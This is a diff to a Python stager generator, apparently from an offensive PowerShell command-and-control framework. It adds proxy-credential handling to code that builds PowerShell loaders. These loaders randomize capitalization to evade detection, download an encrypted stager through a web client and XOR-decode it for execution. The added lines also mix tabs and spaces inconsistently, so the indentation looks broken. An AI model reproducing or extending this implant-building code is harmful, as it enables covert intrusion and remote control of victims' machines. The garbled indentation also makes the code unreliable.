@@ -327,15 +327,17 @@ class Stagers:
                 if proxy.lower() == "default":
                     stager += helpers.randomize_capitalization("$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;")
                 else:
-                    # TODO: implement form for other proxy
                     stager += helpers.randomize_capitalization("$proxy = new-object net.WebProxy;")
                     stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
-                    stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
-                if proxyCreds.lower() == "default":
-                    stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
-                else:
-                    # TODO: implement form for other proxy credentials
-                    pass 
+               	    if proxyCreds.lower() == "default":
+                    	stager += helpers.randomize_capitalization("$proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
+                    else:
+		    	# get custom proxy credentials
+                    	stager += helpers.randomize_capitalization("$proxy.Credentials = New-Object Net.NetworkCredential;")
+			stager += helpers.randomize_capitalization("$proxy.Credentials.UserName = '" + proxyCreds.split(":")[0].split("\\")[1] + "';")
+                        stager += helpers.randomize_capitalization("$proxy.Credentials.Password = '" + proxyCreds.split(":")[1] + "';")
+                        stager += helpers.randomize_capitalization("$proxy.Credentials.Domain = '" + proxyCreds.split(":")[0].split("\\")[0] + "';")
+	            stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
 
         # the stub to decode the encrypted stager download by XOR'ing with the staging key
         stager += helpers.randomize_capitalization("$K=")
